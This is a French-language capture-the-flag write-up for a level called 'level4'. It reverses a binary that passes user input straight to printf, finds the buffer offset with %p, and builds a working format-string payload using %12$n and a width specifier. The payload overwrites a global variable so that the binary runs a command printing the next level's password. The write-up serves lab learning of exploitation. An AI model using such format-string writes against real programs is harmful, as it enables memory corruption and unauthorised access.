Quand on reverse l'executable
On voit que main appel la fonction n qui appel la fonction p.


n() appel fgets() qui recupere de maniere safe notre input.
puis dans la fonction notre input est utiliser en tant que format string pour printf
Ce qui en fait une vulnerabiliter.
Apres la fonction p, une variable a l'adresse 0x8049810 est stockee dans eax puis est comparee a la valeur 0x1025544 (16930116).
Si eax est egal a cette valeur, alors un appel a system est executer avec comme argument:
0x8048590 = "/bin/cat /home/user/level5/.pass"


Il faut donc que l'on arrive a modifier la variable 0x8049810 pour qu'elle soit egale a 0x1025544
Apres quelque test on remarque que 0x8049810 vaut 0.


Grace a la vulnerabilite du printf on va pouvoir utiliser une format string attack afin de modifier la valeur de m (0x8049810)
Pour se faire nous avons besoin de l'emplacement de notre buffer dans la stack au moment ou printf est executer (l'offset)


python -c "print('AAAA' + ' %p '*20)" | ./level4
ce qui devrait nous donner une liste d'adresse dont une egale a 41414141
On retient sa position qui est 12.

et on verifie si le 12e emplacement est bien notre buffer
( '%12\$x' signifie que l'on souhaite utiliser le 12eme argument de printf, donc le 12eme element sur la stack )
python -c "print('AAAA' + '%12\$x')" | ./level4

Maintenant que nous avons l'offset de notre buffer on peut passer a la suite et essayer de changer des valeurs.

On souhaite ecrire l'adresse de m dans notre buffer pour ensuite utiliser le format %n afin d'ecrire le nombre de caractere ecrit avant notre format %n dans notre variable m.
---> ("coucou%n", &nb)  --> nb = 6

1ere etape:
python -c "print('\x10\x98\x04\x08' + '%12\$x')" | ./level4
cela devrait ecrire notre adresse dans le 12eme argument.
Il manque plus qu'a ecrire X caractere et d'utiliser %n.

m doit avoir la valeur 0x1025544
ce qui correspond a 16 930 116 en decimal


On pourrait utiliser quelque chose comme ceci:
python -c "print('\x10\x98\x04\x08' + 'B'*16930116 + '%12\$n')" | ./level4

Mais la taille de notre buffer nous bloquerait pour ecrire autant de B
ce que nous pouvons utiliser est la width de printf. Si on met un format %d avec une width de 500:
%500d, printf ajoutera bien 500 caractere a notre string.

Donc si on souhaite ecrire 0x1025544 dans notre variable m il suffit d'ecrire %16930116d

Mais attention car on ecrit deja 4byte donc on le soustrait a notre valeur ce qui donne %16930112d

python -c "print('\x10\x98\x04\x08'+'%16930112d' + '%12\$n')" | ./level4
